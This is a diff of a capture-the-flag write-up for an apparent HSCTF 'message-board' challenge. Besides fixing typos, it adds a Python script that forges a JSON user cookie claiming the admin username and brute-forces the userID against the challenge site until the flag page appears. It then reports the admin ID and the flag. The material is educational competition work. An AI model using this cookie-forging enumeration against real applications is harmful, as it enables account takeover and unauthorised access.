@@ -119,7 +119,7 @@ The login POST request test if the usersname and password exist in the ``` const
 
 As we can users has **kupatergent** and admin, the password and userID for the admin has been edited for the challenge  
 
-So we can only login as ```kupatergent:gandal``` 
+So we have only the login ```kupatergent:gandal``` 
 
 ![image](https://user-images.githubusercontent.com/72421091/122657442-7c259900-d15b-11eb-802a-4342bb8975ef.png)
 
@@ -157,11 +157,34 @@ As we can the cookie has the userID and the username. So to be able to get the f
 
 j:{"userID":"X","username":"admin"} as X is admin userID 
 
-So we need to brutforce the userID until we got a page with flag 
+So we need to bruteforce the userID until we got a page with flag 
+
+```python
+import requests
+from requests.structures import CaseInsensitiveDict
+
+url = "https://message-board.hsc.tf/"
+
+headers = CaseInsensitiveDict()
+
+for i in range(0, 999):
+    print("userID = " + str(i) ) 
+    headers["Cookie"] = "userData=j:%7B%22userID%22:%22" + str(i)+ "%22,%22username%22:%22admin%22%7D"
+    resp = requests.get(url, headers=headers)
+    page = resp.content.decode("utf-8")
+    if page.find("no flag for you") != 1429:
+        print(page)
+        break
+``` 
+
+![image](https://user-images.githubusercontent.com/72421091/122657971-20114380-d160-11eb-882d-d16ef7934b58.png)
+
+
+We got admin userID which is 768 and the flag 
 
 
 ## Flag
 
 ```
-
+flag{y4m_y4m_c00k13s}
 ```
